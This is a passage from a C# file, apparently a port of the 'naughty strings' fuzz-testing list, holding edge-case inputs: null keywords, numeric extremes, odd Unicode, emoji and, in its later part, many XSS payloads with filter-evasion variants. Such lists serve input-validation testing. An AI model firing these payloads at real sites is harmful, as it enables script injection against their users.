using System.Collections.Generic;

namespace NaughtyStrings
#if Bogus
.Bogus
#endif
{
    public static class TheNaughtyStrings
    {

        /// <summary>
        /// All naughty strings.
        /// </summary>
        public static IReadOnlyList<string> All = new List<string>
        {
            "undefined",
            "undef",
            "null",
            "NULL",
            "(null)",
            "nil",
            "NIL",
            "true",
            "false",
            "True",
            "False",
            "TRUE",
            "FALSE",
            "None",
            "hasOwnProperty",
            "then",
            "constructor",
            "\\",
            "\\\\",
            "0",
            "1",
            "1.00",
            "$1.00",
            "1/2",
            "1E2",
            "1E02",
            "1E+02",
            "-1",
            "-1.00",
            "-$1.00",
            "-1/2",
            "-1E2",
            "-1E02",
            "-1E+02",
            "1/0",
            "0/0",
            "-2147483648/-1",
            "-9223372036854775808/-1",
            "-0",
            "-0.0",
            "+0",
            "+0.0",
            "0.00",
            "0..0",
            ".",
            "0.0.0",
            "0,00",
            "0,,0",
            ",",
            "0,0,0",
            "0.0/0",
            "1.0/0.0",
            "0.0/0.0",
            "1,0/0,0",
            "0,0/0,0",
            "--1",
            "-",
            "-.",
            "-,",
            "999999999999999999999999999999999999999999999999999999999999999999999999999999999" +
    "999999999999999",
            "NaN",
            "Infinity",
            "-Infinity",
            "INF",
            "1#INF",
            "-1#IND",
            "1#QNAN",
            "1#SNAN",
            "1#IND",
            "0x0",
            "0xffffffff",
            "0xffffffffffffffff",
            "0xabad1dea",
            "123456789012345678901234567890123456789",
            "1,000.00",
            "1 000.00",
            "1\'000.00",
            "1,000,000.00",
            "1 000 000.00",
            "1\'000\'000.00",
            "1.000,00",
            "1 000,00",
            "1\'000,00",
            "1.000.000,00",
            "1 000 000,00",
            "1\'000\'000,00",
            "01000",
            "08",
            "09",
            "2.2250738585072011e-308",
            ",./;\'[]\\-=",
            "<>?:\"{}|_+",
            "!@#$%^&*()`~",
            "",
            "",
            @"\t              ​\u2028\u2029  　",
            @"­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿",
            "﻿",
            "￾",
            "Ω≈ç√∫˜µ≤≥÷",
            "åß∂ƒ©˙∆˚¬…æ",
            "œ∑´®†¥¨ˆøπ“‘",
            "¡™£¢∞§¶•ªº–≠",
            "¸˛Ç◊ı˜Â¯˘¿",
            "ÅÍÎÏ˝ÓÔÒÚÆ☃",
            "Œ„´‰ˇÁ¨ˆØ∏”’",
            "`⁄€‹›ﬁﬂ‡°·‚—±",
            "⅛⅜⅝⅞",
            "ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя",
            "٠١٢٣٤٥٦٧٨٩",
            "⁰⁴⁵",
            "₀₁₂",
            "⁰⁴⁵₀₁₂",
            @"ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็",
            "\'",
            "\"",
            "\'\'",
            "\"\"",
            "\'\"\'",
            "\"\'\'\'\'\"\'\"",
            "\"\'\"\'\"\'\'\'\'\"",
            "<foo val=“bar” />",
            "<foo val=“bar” />",
            "<foo val=”bar“ />",
            "<foo val=`bar\' />",
            "田中さんにあげて下さい",
            "パーティーへ行かないか",
            "和製漢語",
            "部落格",
            "사회과학원 어학연구소",
            "찦차를 타고 온 펲시맨과 쑛다리 똠방각하",
            "社會科學院語學研究所",
            "울란바토르",
            "𠜎𠜱𠝹𠱓𠱸𠲖𠳏",
            "𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖𐐇𐐤𐐓𐐝 𐐱𐑂 𐑄 𐐔" +
    "𐐇𐐝𐐀𐐡𐐇𐐓 𐐏𐐆𐐅𐐤𐐆𐐚𐐊𐐡𐐝𐐆𐐓𐐆",
            "表",
            "ポ",
            "あ",
            "A",
            "鷗",
            "Œ",
            "é",
            "Ｂ",
            "逍",
            "Ü",
            "ß",
            "ª",
            "ą",
            "ñ",
            "丂",
            "㐀",
            "𠀀",
            "Ⱥ",
            "Ⱦ",
            "ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ",
            "(｡◕ ∀ ◕｡)",
            "｀ｨ(´∀｀∩",
            "__ﾛ(,_,*)",
            "・(￣∀￣)・:*:",
            "ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ",
            ",。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’",
            "(╯°□°）╯︵ ┻━┻)",
            "(ﾉಥ益ಥ）ﾉ﻿ ┻━┻",
            "┬─┬ノ( º _ ºノ)",
            "( ͡° ͜ʖ ͡°)",
            "¯\\_(ツ)_/¯",
            "😍",
            "👩🏽",
            "👨‍🦰 👨🏿‍🦰 👨‍🦱 👨🏿‍🦱 🦹🏿‍♂️",
            "👾 🙇 💁 🙅 🙆 🙋 🙎 🙍",
            "🐵 🙈 🙉 🙊",
            "❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙",
            "✋🏿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿",
            "👨‍👩‍👦 👨‍👩‍👧‍👦 👨‍👨‍👦 👩‍👩‍👧 👨‍👦 👨‍👧‍👦 👩‍👦 👩‍👧‍👦",
            "🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧",
            "0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟",
            "🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸",
            "🇺🇸🇷🇺🇸🇦🇫🇦🇲",
            "🇺🇸🇷🇺🇸🇦",
            "１２３",
            "١٢٣",
            "ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ا" +
    "يطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما, يذكر الحدود أي بعد, معامل" +
    "ة بولندا، الإطلاق عل إيو.",
            "בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ",
            "הָיְתָהtestالصفحات التّحول",
            "﷽",
            "ﷺ",
            "مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُ" +
    "صَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ،",
            "الكل في المجمو عة (5)",
            "᚛ᚄᚓᚐᚋᚒᚄ ᚑᚄᚂᚑᚏᚅ᚜",
            "᚛                 ᚜",
            "‪‪test‪",
            "‫test‫",
            "\u2029test\u2029",
            "test⁠test‫",
            "⁦test⁧",
            "Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣" +
    "̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇" +
    "̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣",
            "̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍" +
    "̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰",
            "̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠" +
    "̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮" +
    "͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟",
            "̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i" +
    "̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕",
            "Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮",
            "˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs \'ʇᴉlǝ ƃuᴉɔsᴉdᴉ" +
    "pɐ ɹnʇǝʇɔǝsuoɔ \'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥",
            "00˙Ɩ$-",
            "Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ",
            "𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠",
            "𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌",
            "𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐𝒘𝒏 𝒇𝒐𝒙 𝒋𝒖𝒎𝒑𝒔 𝒐𝒗𝒆𝒓 𝒕𝒉𝒆 𝒍𝒂𝒛𝒚 𝒅𝒐𝒈",
            "𝓣𝓱𝓮 𝓺𝓾𝓲𝓬𝓴 𝓫𝓻𝓸𝔀𝓷 𝓯𝓸𝔁 𝓳𝓾𝓶𝓹𝓼 𝓸𝓿𝓮𝓻 𝓽𝓱𝓮 𝓵𝓪𝔃𝔂 𝓭𝓸𝓰",
            "𝕋𝕙𝕖 𝕢𝕦𝕚𝕔𝕜 𝕓𝕣𝕠𝕨𝕟 𝕗𝕠𝕩 𝕛𝕦𝕞𝕡𝕤 𝕠𝕧𝕖𝕣 𝕥𝕙𝕖 𝕝𝕒𝕫𝕪 𝕕𝕠𝕘",
            "𝚃𝚑𝚎 𝚚𝚞𝚒𝚌𝚔 𝚋𝚛𝚘𝚠𝚗 𝚏𝚘𝚡 𝚓𝚞𝚖𝚙𝚜 𝚘𝚟𝚎𝚛 𝚝𝚑𝚎 𝚕𝚊𝚣𝚢 𝚍𝚘𝚐",
            "⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢",
            "<script>alert(123)</script>",
            "&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;",
            "<img src=x onerror=alert(123) />",
            "<svg><script>123<1>alert(123)</script>",
            "\"><script>alert(123)</script>",
            "\'><script>alert(123)</script>",
            "><script>alert(123)</script>",
            "</script><script>alert(123)</script>",
            "< / script >< script >alert(123)< / script >",
            " onfocus=JaVaSCript:alert(123) autofocus",
            "\" onfocus=JaVaSCript:alert(123) autofocus",
            "\' onfocus=JaVaSCript:alert(123) autofocus",
            "＜script＞alert(123)＜/script＞",
            "<sc<script>ript>alert(123)</sc</script>ript>",
            "--><script>alert(123)</script>",
            "\";alert(123);t=\"",
            "\';alert(123);t=\'",
            "JavaSCript:alert(123)",
            ";alert(123);",
            "src=JaVaSCript:prompt(132)",
            "\"><script>alert(123);</script x=\"",
            "\'><script>alert(123);</script x=\'",
            "><script>alert(123);</script x=",
            "\" autofocus onkeyup=\"javascript:alert(123)",
            "\' autofocus onkeyup=\'javascript:alert(123)",
            "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>",
            "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
            "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
            "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>",
            "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
            "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
            "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>",
            "\'`\"><\\x3Cscript>javascript:alert(1)</script>",
            "\'`\"><\\x00script>javascript:alert(1)</script>",
            "ABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF",
            "ABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF",
            "<a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "<a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
            "`\"\'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x22onerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x0Donerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x09onerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x0Conerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x00onerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x27onerror=javascript:alert(1)>",
            "`\"\'><img src=xxx:x \\x20onerror=javascript:alert(1)>",
            "\"`\'><script>\\x3Bjavascript:alert(1)</script>",
            "\"`\'><script>\\x0Djavascript:alert(1)</script>",
            "\"`\'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x81javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x84javascript:alert(1)</script>",
            "\"`\'><script>\\xE3\\x80\\x80javascript:alert(1)</script>",
            "\"`\'><script>\\x09javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x89javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x85javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x88javascript:alert(1)</script>",
            "\"`\'><script>\\x00javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>",
            "\"`\'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>",
            "\"`\'><script>\\x0Cjavascript:alert(1)</script>",
            "\"`\'><script>\\x2Bjavascript:alert(1)</script>",
            "\"`\'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>",
            "\"`\'><script>-javascript:alert(1)</script>",
            "\"`\'><script>\\x0Ajavascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>",
            "\"`\'><script>\\x7Ejavascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x87javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>",
            "\"`\'><script>\\xC2\\x85javascript:alert(1)</script>",
            "\"`\'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x83javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>",
            "\"`\'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x80javascript:alert(1)</script>",
            "\"`\'><script>\\x21javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x82javascript:alert(1)</script>",
            "\"`\'><script>\\xE2\\x80\\x86javascript:alert(1)</script>",
            "\"`\'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>",
            "\"`\'><script>\\x0Bjavascript:alert(1)</script>",
            "\"`\'><script>\\x20javascript:alert(1)</script>",
            "\"`\'><script>\\xC2\\xA0javascript:alert(1)</script>",
            "<img \\x00src=x onerror=\"alert(1)\">",
            "<img \\x47src=x onerror=\"javascript:alert(1)\">",
            "<img \\x11src=x onerror=\"javascript:alert(1)\">",
            "<img \\x12src=x onerror=\"javascript:alert(1)\">",
            "<img\\x47src=x onerror=\"javascript:alert(1)\">",
            "<img\\x10src=x onerror=\"javascript:alert(1)\">",
            "<img\\x13src=x onerror=\"javascript:alert(1)\">",
            "<img\\x32src=x onerror=\"javascript:alert(1)\">",
            "<img\\x47src=x onerror=\"javascript:alert(1)\">",
            "<img\\x11src=x onerror=\"javascript:alert(1)\">",
            "<img \\x47src=x onerror=\"javascript:alert(1)\">",
            "<img \\x34src=x onerror=\"javascript:alert(1)\">",
            "<img \\x39src=x onerror=\"javascript:alert(1)\">",
            "<img \\x00src=x onerror=\"javascript:alert(1)\">",
            "<img src\\x09=x onerror=\"javascript:alert(1)\">",
            "<img src\\x10=x onerror=\"javascript:alert(1)\">",
            "<img src\\x13=x onerror=\"javascript:alert(1)\">",
            "<img src\\x32=x onerror=\"javascript:alert(1)\">",
            "<img src\\x12=x onerror=\"javascript:alert(1)\">",
            "<img src\\x11=x onerror=\"javascript:alert(1)\">",
            "<img src\\x00=x onerror=\"javascript:alert(1)\">",
            "<img src\\x47=x onerror=\"javascript:alert(1)\">",
            "<img src=x\\x09onerror=\"javascript:alert(1)\">",
            "<img src=x\\x10onerror=\"javascript:alert(1)\">",
            "<img src=x\\x11onerror=\"javascript:alert(1)\">",
            "<img src=x\\x12onerror=\"javascript:alert(1)\">",
            "<img src=x\\x13onerror=\"javascript:alert(1)\">",
            "<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">",
            "<img src=x onerror=\\x09\"javascript:alert(1)\">",
            "<img src=x onerror=\\x10\"javascript:alert(1)\">",
            "<img src=x onerror=\\x11\"javascript:alert(1)\">",
            "<img src=x onerror=\\x12\"javascript:alert(1)\">",
            "<img src=x onerror=\\x32\"javascript:alert(1)\">",
            "<img src=x onerror=\\x00\"javascript:alert(1)\">",
            "<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>",
            "<img src=\"x` `<script>javascript:alert(1)</script>\"` `>",
            "<img src onerror /\" \'\"= alt=javascript:alert(1)//\">",
            "<title onpropertychange=javascript:alert(1)></title><title title=>",
            "<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:aler" +
    "t(1)></a>\">",
            "<!--[if]><script>javascript:alert(1)</script -->",
            "<!--[if<img src=x onerror=javascript:alert(1)//]> -->",
            "<script src=\"/\\%(jscript)s\"></script>",
            "<script src=\"\\\\%(jscript)s\"></script>",
            "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
            "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
            "<IMG SRC=# onmouseover=\"alert(\'xxs\')\">",
            "<IMG SRC= onmouseover=\"alert(\'xxs\')\">",
            "<IMG onmouseover=\"alert(\'xxs\')\">",
